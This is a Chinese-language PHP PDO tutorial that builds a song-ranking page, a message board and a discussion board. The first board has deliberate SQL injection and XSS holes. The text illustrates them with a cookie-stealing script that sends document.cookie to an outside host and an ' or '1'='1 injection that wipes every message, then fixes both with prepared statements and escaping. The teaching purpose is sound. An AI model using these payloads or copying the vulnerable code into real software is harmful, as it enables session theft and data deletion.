<html>
<head>
	<title>線上教材：WEB 程式設計</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<link rel=stylesheet type="text/css" href="myCss.css" />
	<base target="_blank">
	<script type="text/javascript" src="myJs.js"></script>
	<script type="text/javascript" src="shCore.js"></script>
	<script type="text/javascript" src="shBrushXml.js"></script>
	<script type="text/javascript" src="shBrushMine.js"></script>
	<link href="shCore.css" rel="stylesheet" type="text/css" />
	<link href="shThemeDefault.css" rel="stylesheet" type="text/css" />
	<script type="text/javascript">
		SyntaxHighlighter.all();
	</script>
	</head>

<body bgcolor="#ccccff">

<blockquote>

<p>
PDO 是 PHP Data Object 的意思，它是一個抽象的操作方式，所以若是後端需要更換資料庫，則在程式碼上的修改會花比較少的功夫。較新版本的 PHP 設定檔已預設開啟 PDO 功能，若使用較舊版的 PHP，例如 AppServ 附帶的版本，則需要對 php.ini 先進行一些修改(設定完成後，重新啟動 Apache，應該就可以開始測試)：</p>
<ul>
	<li>設定外掛資料夾(extension_dir)，例如 "C:\AppServ\php5\ext"</li>
	<li>找到 Dynamic Extensions，將所有的 php_pdo_*.dll 取消註解</li>
</ul>

<p>我們先從顯示全部排行榜的範例開始看起：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;pdoInc.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;table border=&quot;1&quot;&gt;	&lt;tr&gt;		&lt;th&gt;資料序號&lt;/th&gt;		&lt;th&gt;當日排名&lt;/th&gt;		&lt;th&gt;前日排名&lt;/th&gt;		&lt;th&gt;歌曲名稱&lt;/th&gt;		&lt;th&gt;演 唱 者&lt;/th&gt;	&lt;/tr&gt;	&lt;?php		$sql = &quot;SELECT * from songrank&quot;;		$sth = $dbh-&gt;query($sql);		while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){			echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row['id'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['this_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['prev_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['song_name'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['singer_name'].&quot;&lt;/td&gt;&lt;tr&gt;&quot;;		}	?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>其中，pdoInc.php 包含的是建立連線所需的相關資訊，其內容如下：</p>
<pre class="brush: htmljsphp">﻿&lt;?php$db_server = &quot;localhost&quot;;$db_user = &quot;abcd&quot;;$db_passwd = &quot;1234&quot;;$db_name = &quot;wxyx&quot;;try {	$dsn = &quot;mysql:host=$db_server;dbname=$db_name&quot;;	$dbh = new PDO($dsn, $db_user, $db_passwd);}catch (Exception $e){	die('無法對資料庫連線');}$dbh-&gt;exec(&quot;SET NAMES utf8&quot;);?&gt;</pre>
<br>
<p>在上述範例中，PDO 的 query 方法，會回傳對資料庫的查詢結果，故適用於取得資料的 select 敘述；PDO::FETCH_ASSOC 則代表抓取出來的資料是 assocciative array，如果你喜歡的話，也可以使用 PDO::FETCH_NUM (indexed array)、PDO::FETCH_BOTH (indexed 與 assocciative 皆有，是預設值)等選項。</p>

<p>接著，我們要使用 insert 和 delete 敘述，並且接受使用者輸入，來製作一個簡單的匿名留言板。這個留言板在留言時可以自訂綽號，並且可以自訂將來刪除用的密碼。我們建立一張資料表 msgboard 給這個留言板使用，包含以下欄位(你可以依據個別需求來調整細部設定，例如若需支援中文，可以將編碼選定為 utf8_general_ci)：</p>
<ul>
	<li>id: 留言編號，與密碼對照後可刪除。類型 INT，主鍵，自動遞增</li>
	<li>nickname: 留言時的綽號。類型 VARCHAR，長度 32，預設值為空</li>
	<li>time: 留言的時間。類型 TIMESTAMP，預設值選擇「CURRENT_TIMESTAMP」</li>
	<li>content: 留言內容。類型 VARCHAR，長度 1024，預設值為空</li>
	<li>pwd: 刪除用的密碼。類型 VARCHAR，長度 16，預設值為空</li>
	<li>ip: 留言的 IP。類型 VARCHAR，長度 40，預設值為空</li>
</ul>

<p>完整的留言板程式碼如下，其中由於 insert 及 delete 敘述會改變資料，所以需改用 exec 方法(將來使用到 update 時亦同)：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;../examples/pdoInc.php&quot;);function showMsg($row){	$nn = $row['nickname'];	$msg = $row['content'];	echo &quot;#&quot;.$row['id'].&quot; (&quot;.$row['time'].&quot;): &quot;.$msg.&quot; by &quot;.$nn.&quot;&lt;br&gt;&quot;;}// 如果有留言，則加入之if(isset($_POST['nickname']) &amp; isset($_POST['content']) &amp;&amp; $_POST['nickname'] &amp;&amp; $_POST['content']){	$nn = $_POST['nickname'];	$msg = $_POST['content'];	$pwd = $_POST['pwd'];	$sql = &quot;INSERT INTO msgboard (nickname, content, pwd) VALUES ('$nn', '$msg', '$pwd')&quot;;	$dbh-&gt;exec($sql);	echo '&lt;meta http-equiv=REFRESH CONTENT=0;url='.basename($_SERVER['PHP_SELF']).'&gt;';}// 如果有刪除請求，則刪除之if(isset($_POST['del_id']) &amp; isset($_POST['del_pwd']) &amp;&amp; $_POST['del_id'] &amp;&amp; $_POST['del_pwd']){	$id = $_POST['del_id'];	$pwd = $_POST['del_pwd'];	$sql = &quot;DELETE FROM msgboard WHERE id='$id' AND pwd='$pwd'&quot;;	$dbh-&gt;exec($sql);	echo '&lt;meta http-equiv=REFRESH CONTENT=0;url='.basename($_SERVER['PHP_SELF']).'&gt;';}?&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;textarea{vertical-align:top}&lt;/style&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;&lt;?php echo basename($_SERVER['PHP_SELF']);?&gt;&quot; method=&quot;post&quot;&gt;	&lt;p&gt;	綽號：&lt;input type=&quot;text&quot; name=&quot;nickname&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	內容：&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	密碼：&lt;input type=&quot;text&quot; name=&quot;pwd&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	&lt;/p&gt;	&lt;p&gt;	刪除編號：&lt;input type=&quot;text&quot; name=&quot;del_id&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	該篇密碼：&lt;input type=&quot;text&quot; name=&quot;del_pwd&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	&lt;/p&gt;	&lt;input type=&quot;submit&quot; value=&quot;送出&quot;&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php	$sql = 'SELECT * from msgboard ORDER BY id DESC';	$sth = $dbh-&gt;query($sql);	while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){		showMsg($row);	}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>然而這個留言板存在不少問題，以下進行簡單的解說：</p>
<ul>
	<li>Script Insertion / XSS (cross site script)：此一範例完全沒有阻擋特殊字元的輸入，如果在內容處輸入「&lt;script&gt;alert("OAO");&lt;/script&gt;」，則每個來看留言板的人，就都會看到警告視窗跳出。		需要注意的是，若可以插入警告視窗，則很可能代表你可以插入更加惡意的程式碼，例如「&lt;script&gt;location.href="http://some.host.com?aaa.php?c="+document.cookie;&lt;/script&gt;」可以用來偷竊你的 cookie。</li>
	<li>SQL injection：在形成 SQL 指令時，是用字串連接的方式，而若使用者加入惡意字元，則會達成意想不到的效果。首先，請試著在刪除留言時的編號欄輸入任何內容，並在密碼欄輸入「' or '1'='1」。你會發現留言全部不見了！原因是，串出來的 SQL 指令變為「DELETE FROM msgboard WHERE id='你填的id' AND pwd='<font color="red">' or '1'='1</font>'」，亦即任何條件都符合。</li>
	<li><a href="http://plainpass.com/">密碼沒加密</a>：如果網站的密碼以明文儲存，則若伺服器遭到入侵，或管理者不足以信任時，都可能造成你的密碼外洩，如果你恰好在其他地方也使用同樣的密碼，則又會進一步的造成其他資訊外洩。</li>
</ul>

<p>其中的 SQL injection 問題，可以使用"prepared statement"來避免。Prepared statement 會要求你在需要填入資料的地方，使用參數的方式來給值。以下是顯示排行榜的範例，但是多了一個輸入，讓你可以只顯示特定排名以內的資料：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;pdoInc.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;php_pdo_showRankTable_prepare.php&quot; method=&quot;post&quot;&gt;	&lt;input type=&quot;text&quot; name=&quot;maxrank&quot; placeholder=&quot;請輸入排名值&quot; value=&quot;&quot;&gt;	&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;table border=&quot;1&quot;&gt;	&lt;tr&gt;		&lt;th&gt;資料序號&lt;/th&gt;		&lt;th&gt;當日排名&lt;/th&gt;		&lt;th&gt;前日排名&lt;/th&gt;		&lt;th&gt;歌曲名稱&lt;/th&gt;		&lt;th&gt;演 唱 者&lt;/th&gt;	&lt;/tr&gt;	&lt;?php		$maxrank = (isset($_POST['maxrank'])&amp;&amp;$_POST['maxrank']!='')?$_POST['maxrank']:50;		$sth = $dbh-&gt;prepare('SELECT * FROM songrank WHERE this_rank &lt; ?');		$sth-&gt;execute(array($maxrank));		while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){			echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row['id'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['this_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['prev_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['song_name'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['singer_name'].&quot;&lt;/td&gt;&lt;tr&gt;&quot;;		}	?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>若要將 prepared statement 應用於前述有問題的留言板，也只需要依樣修改：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;pdoInc.php&quot;);function getIp(){	return $_SERVER['REMOTE_ADDR'];}function showMsg($row){	$nn = htmlspecialchars($row['nickname']);	$msg = htmlspecialchars($row['content']);	$msg = str_replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;, $msg);	echo &quot;&lt;table border=\&quot;1\&quot;&gt;&lt;tr&gt;&quot;;	echo &quot;&lt;td&gt;留言人: &quot;.$nn.&quot;&lt;/td&gt;&quot;;	echo &quot;&lt;td&gt;時間: &quot;.$row['time'].&quot;&lt;/td&gt;&quot;;	echo &quot;&lt;td&gt;位置: &quot;.$row['ip'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;	echo &quot;&lt;tr&gt;&lt;td colspan=\&quot;3\&quot;&gt;留言內容:&lt;br&gt;&quot;.$msg.&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;&quot;;}// 如果有留言，則加入之if(isset($_POST['nickName']) &amp;&amp; isset($_POST['msgBody']) &amp;&amp; $_POST['nickName']!='' &amp;&amp; $_POST['msgBody']!=''){	$sth = $dbh-&gt;prepare('INSERT INTO msgboard (nickname, content, ip) VALUES (?, ?, ?)');	$sth-&gt;execute(array($_POST['nickName'], $_POST['msgBody'], getIp()));	echo '&lt;meta http-equiv=REFRESH CONTENT=0;url=' . basename($_SERVER['PHP_SELF']) . '&gt;';}?&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;textarea{vertical-align:top}&lt;/style&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;&lt;?php echo basename($_SERVER['PHP_SELF']);?&gt;&quot; method=&quot;post&quot;&gt;	綽號：&lt;input type=&quot;text&quot; name=&quot;nickName&quot;&gt;&lt;br&gt;	內容：&lt;textarea name=&quot;msgBody&quot;&gt;&lt;/textarea&gt;&lt;br&gt;	&lt;input type=&quot;submit&quot; value=&quot;送出&quot;&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php	$sth = $dbh-&gt;query('SELECT * from msgboard ORDER BY id DESC');	while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){		showMsg($row);	}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>在上述範例中，除了使用 prepared statement 解決 SQL injection 以外，也順便以「htmlspecialchars」處理了 XSS 的問題，而為了範例安排的需求，輸入密碼移除留言的功能則暫不示範如何修改。各位若有興趣，可參考"Session"篇章對密碼進行 md5 等加密的方式，來保護使用者提供的密碼。</p>

<p>
另外要注意的是，在 prepared statement 當中，表格和欄位名稱不能當作參數。若在你的程式中，表格或欄位名稱可能來自使用者輸入時，建議使用白名單過濾，例如用 switch...case 敘述列出各種表格或欄位名稱的處理狀況，或者用 in_array 判斷輸入之名稱是否在允許的清單之列。
</p>

<p>接著來看看一個架構比較多層的簡易討論板。此討論板將內容會區分成不同的看板，接著才是各個討論串與其回應。在資料表的設定上，我們分成兩張表，其參考設定如下：</p>
<ul>
	<li>dz_board，儲存看板資料：
		<ul>
			<li>id: 看板編號，由 1 起算。類型 INT，主鍵，自動遞增</li>
			<li>name: 看板名稱。類型 VARCHAR，長度 64，utf8_general_ci，預設值空</li>
		</ul>
	</li>
	<br>

	<li>dz_thread，儲存討論串資料：
		<ul>
			<li>id: 文章編號，由 1 起算。類型 INT，主鍵，自動遞增</li>
			<li>root_thread_id: 所屬於哪一串討論串，若本身是樓主則此欄為 0。類型 INT，預設值 0</li>
			<li>board_id: 討論串所屬的看板編號，若本身非樓主則此欄為 0。類型 INT，預設值 0</li>
			<li>time: 發表時間。類型 TIMESTAMP，預設值 CURRENT_TIMESTAMP</li>
			<li>nickname: 發文者暱稱。類型 VARCHAR，長度 32，utf8_general_ci，預設值空</li>
			<li>title: 文章標題，若本身非樓主則此欄為空。類型 VARCHAR，長度 64，utf8_general_ci，預設值空</li>
			<li>content: 文章內容。類型 VARCHAR，長度 1024，utf8_general_ci，預設值空</li>
			<li>ip: 發文者 IP。類型 VARCHAR，長度 64，預設值空</li>
		</ul>
	</li>
</ul>

<p>顯示看板列表的部分非常簡單，只需要顯示 dz_board 當中的資料即可：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;pdoInc.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;?php	$sth = $dbh-&gt;query('SELECT * from dz_board ORDER BY id');	while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){		echo '&lt;a href=&quot;php_pdo_dz_viewBoard.php?id='.$row['id'].'&quot;&gt;'.$row['name'].'&lt;/a&gt;&lt;br&gt;';	}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>php_pdo_dz_viewBoard.php 則是負責顯示各個看板下的討論串標題，以及發起新的討論串。並且為了避免使用者將討論串發起到不存在的看板，我們需要對 dz_board 資料表做查詢，以知道使用者送來的看板 id 是否真實存在：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;pdoInc.php&quot;);$sthBoard = $dbh-&gt;prepare('SELECT id, name FROM dz_board WHERE id = ?');if(isset($_GET['id']) &amp;&amp; isset($_POST['nickname']) &amp;&amp; isset($_POST['title']) &amp;&amp; isset($_POST['content'])){	$sthBoard-&gt;execute(array((int)$_GET['id']));	if($sthBoard-&gt;rowCount() == 1){		$sth = $dbh-&gt;prepare(			'INSERT INTO dz_thread (board_id, nickname, title, content, ip) VALUES (?, ?, ?, ?, ?)'		);		$sth-&gt;execute(array(			(int)$_GET['id'],			$_POST['nickname'],			$_POST['title'],			$_POST['content'],			$_SERVER['REMOTE_ADDR']		));		echo '&lt;meta http-equiv=REFRESH CONTENT=0;url=php_pdo_dz_viewBoard.php?id='.(int)$_GET['id'].'&gt;';	}}?&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;textarea{vertical-align:top}&lt;/style&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;?phpif(isset($_GET['id'])){	$sth = $dbh-&gt;prepare('SELECT id, name FROM dz_board WHERE id = ?');	$sthBoard-&gt;execute(array((int)$_GET['id']));	if($sthBoard-&gt;rowCount() == 1){		$row = $sthBoard-&gt;fetch(PDO::FETCH_ASSOC)?&gt;		&lt;form action=&quot;php_pdo_dz_viewBoard.php?id=&lt;?php echo (int)$_GET['id'];?&gt;&quot; method=&quot;post&quot;&gt;			於&lt;?php echo $row['name'];?&gt;發表主題：&lt;br&gt;			暱稱：&lt;input name=&quot;nickname&quot;&gt;&lt;br&gt;			標題：&lt;input name=&quot;title&quot;&gt;&lt;br&gt;			內容：&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br&gt;			&lt;input type=&quot;submit&quot;&gt;		&lt;/form&gt;		&lt;hr&gt;&lt;?php		$sth = $dbh-&gt;prepare('SELECT * from dz_thread WHERE board_id = ? ORDER BY id');			$sth-&gt;execute(array((int)$_GET['id']));			while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){				echo '&lt;a href=&quot;php_pdo_dz_viewThread.php?id='.$row['id'].'&quot;&gt;'.htmlspecialchars($row['title']).'&lt;/a&gt; by '.htmlspecialchars($row['nickname']).' from '.$row['ip'].'&lt;br&gt;';			}	}	else {		echo '看板不存在';	}}else {	echo '未指定看板';}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>顯示討論串內容和發表回應的部分，也跟顯示看板的作法非常相似，只需要把對應的部份作些修改，整體內容如下：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;pdoInc.php&quot;);function showMsg($row, $numFloor){	$title = htmlspecialchars($row['title']);	$nn = htmlspecialchars($row['nickname']);	$msg = htmlspecialchars($row['content']);	$msg = str_replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;, $msg);	if($numFloor == 0){		echo '討論串標題：'.$title.'&lt;br&gt;&lt;br&gt;';	}	echo &quot;#&quot;.($numFloor+1);	echo &quot;&lt;table border=\&quot;1\&quot;&gt;&lt;tr&gt;&quot;;	echo &quot;&lt;td&gt;留言人: &quot;.$nn.&quot;&lt;/td&gt;&quot;;	echo &quot;&lt;td&gt;時間: &quot;.$row['time'].&quot;&lt;/td&gt;&quot;;	echo &quot;&lt;td&gt;位置: &quot;.$row['ip'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;	echo &quot;&lt;tr&gt;&lt;td colspan=\&quot;3\&quot;&gt;留言內容:&lt;br&gt;&quot;.$msg.&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;&quot;;}if(isset($_GET['id']) &amp;&amp; isset($_POST['nickname']) &amp;&amp; isset($_POST['content'])){	$sth = $dbh-&gt;prepare('SELECT id FROM dz_thread WHERE id = ? and board_id &lt;&gt; 0');	$sth-&gt;execute(array((int)$_GET['id']));	if($sth-&gt;rowCount() &gt; 0){		$sth2 = $dbh-&gt;prepare(			'INSERT INTO dz_thread (nickname, content, ip, root_thread_id) VALUES (?, ?, ?, ?)'		);		$sth2-&gt;execute(array(			$_POST['nickname'],			$_POST['content'],			$_SERVER['REMOTE_ADDR'],			(int)$_GET['id']		));		echo '&lt;meta http-equiv=REFRESH CONTENT=0;url=php_pdo_dz_viewThread.php?id='.(int)$_GET['id'].'&gt;';	}}?&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;textarea{vertical-align:top}&lt;/style&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;?php	if(isset($_GET['id'])){		$sth = $dbh-&gt;prepare('			SELECT * from dz_thread			WHERE (id = ? and board_id &lt;&gt; 0)			OR (root_thread_id = ?)			ORDER BY id		');		$sth-&gt;execute(array((int)$_GET['id'], (int)$_GET['id']));		if($sth-&gt;rowCount() &gt; 0){?&gt;			&lt;form action=&quot;php_pdo_dz_viewThread.php?id=&lt;?php echo (int)$_GET['id'];?&gt;&quot; method=&quot;post&quot;&gt;				發表回應：&lt;br&gt;				暱稱：&lt;input name=&quot;nickname&quot;&gt;&lt;br&gt;				內容：&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br&gt;				&lt;input type=&quot;submit&quot;&gt;			&lt;/form&gt;			&lt;hr&gt;&lt;?php			$numFloor = 0;			while($row = $sth-&gt;fetch(PDO::FETCH_ASSOC)){				showMsg($row, $numFloor++);			}		}		else {			echo '討論串不存在';		}	}	else {		echo '未指定討論串';	}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
</blockquote>

</body></html>
